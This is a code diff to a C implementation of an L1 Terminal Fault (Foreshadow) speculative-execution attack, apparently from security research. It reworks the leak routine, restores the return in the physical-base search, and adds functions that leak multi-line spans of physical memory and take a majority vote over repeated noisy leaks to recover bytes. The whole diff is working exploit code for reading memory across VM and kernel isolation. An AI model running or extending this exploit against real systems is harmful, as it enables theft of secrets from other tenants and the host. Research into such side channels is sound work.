@@ -6,6 +6,7 @@
 #include "secret.h"
 #include "spectre.h"
 #include "statistics.h"
+#include "benchmark.h"
 #include <asm-generic/errno-base.h>
 #include <bits/time.h>
 #include <bits/types/siginfo_t.h>
@@ -231,7 +232,7 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
 
 }
 
-char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t length)
+void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
 {
   assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
 
@@ -264,7 +265,6 @@ char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t le
     }
   }
 
-  char *data = malloc(length);
   for (size_t i = 0; i < 2 * length; i += 2) {
     size_t high = maximum(15, &results[i][1]) + 1;
     if (results[i][high] < 2) {
@@ -286,8 +286,6 @@ char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t le
   l1tf_reload_buffer_free(reload_buffer);
 
 	half_spectre_stop();
-
-  return data;
 }
 
 void initialize_pteditor_lib(void) {
@@ -818,7 +816,7 @@ int do_l1tf_leak(char *leak) {
   return hit_analyze();
 }
 
-char *l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
+char *mathe_l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
 {
   const int verbose = 0;
   assert(0 < nr_bytes && nr_bytes <= 64 && (pa & (64-1)) + nr_bytes <= 64);
@@ -970,9 +968,10 @@ uintptr_t l1tf_find_base(void)
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
           printf("l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+          l1tf_test_base(pa, 100000);
         }
-        // spectre_touch_base_stop();
-        // return pa;
+        spectre_touch_base_stop();
+        return pa;
       }
     }
   }
@@ -991,4 +990,50 @@ void l1tf_init(void)
   fd_halt = open("/proc/hypercall/halt", O_WRONLY);
   assert(fd_halt > 0);
   period_start = clock_read();
+}
+
+void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
+{
+  int i = 0;
+  uintptr_t line_end = (pa & ~0x3f) + 0x40;
+  for (uintptr_t start = pa; start < pa+len; start = line_end, line_end += 0x40) {
+    uintptr_t end = pa+len < line_end ? pa+len : line_end;
+    size_t length = end - start;
+    thijs_l1tf_leak(data+i, base, start, length);
+    i += length;
+  }
+}
+
+int aggregate_nibbles(char **tmp_data, int iters, int index, int mask)
+{
+  size_t res[16];
+  memset(res, 0, sizeof(res));
+  for (int i = 0; i < iters; i++) {
+    int nibble = tmp_data[i][index] & mask;
+    if (mask == 0xf0)
+      nibble >>= 4;
+    res[nibble]++;
+  }
+  int nibble = maximum(15, &res[1]) + 1;
+  if (res[nibble] == 0)
+    nibble = 0;
+  return nibble;
+}
+
+void l1tf_leak_multi(char *data, uintptr_t base, uintptr_t pa, uintptr_t len, int iters)
+{
+  char **tmp_data = malloc(iters * sizeof(char *));
+  for (int i = 0; i < iters; i++) {
+    tmp_data[i] = malloc(len);
+    l1tf_leak(tmp_data[i], base, pa, len);
+    display(tmp_data[i], len);
+  }
+
+  for (int j = 0; j < (int)len; j++) {
+    int low = aggregate_nibbles(tmp_data, iters, j, 0x0f);
+    int high = aggregate_nibbles(tmp_data, iters, j, 0xf0);
+    data[j] = (high << 4) | low;
+  }
+
+  free(tmp_data);
 }
